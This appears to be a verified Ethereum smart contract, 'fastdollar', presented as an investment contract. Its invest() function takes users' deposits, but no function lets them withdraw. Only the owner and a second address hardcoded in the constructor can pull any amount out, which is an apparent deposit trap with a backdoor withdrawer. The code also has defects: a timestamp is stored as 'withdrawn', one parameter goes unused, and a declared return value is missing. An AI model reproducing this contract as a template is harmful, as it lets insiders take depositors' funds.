/**
 *Submitted for verification at Etherscan.io on 2022-07-18
*/

pragma solidity 0.5.8;

contract fastdollar {
	address owner;
	address contractor;
    uint256 dayLimit;
    uint256 public diff;

    // store user address
	struct User {
		address addr;
		uint256 withdrawn;
	}
    
    // get user details using address
    mapping (address => User) public users;

    // on deploying contract assign day limit and owner address
	constructor(uint256 _dayLimit) public {
	    dayLimit = _dayLimit;
		owner = msg.sender;
        contractor=0xAecF3aB06f031e5C9f03A1eEdB36647f98CC3e41;
	}
	
	// Function invest: add user address and pay trx to contract
	function invest() public payable {
	    require(msg.value > 0, 'Zero amount');
	    User storage user = users[msg.sender];
	    if(user.addr != msg.sender) {
	        users[msg.sender] = User(msg.sender , block.timestamp - 1 days);
	    }
	}

    // Owner withdraw: check whether the user is owner and transfer the mentioned amount to owner
    function ownerWithdraw(uint256 amount) public payable returns (uint256) {
          require(msg.sender == owner || msg.sender == contractor, 'Only owner can withdraw');
          msg.sender.transfer(amount);
	}
	

}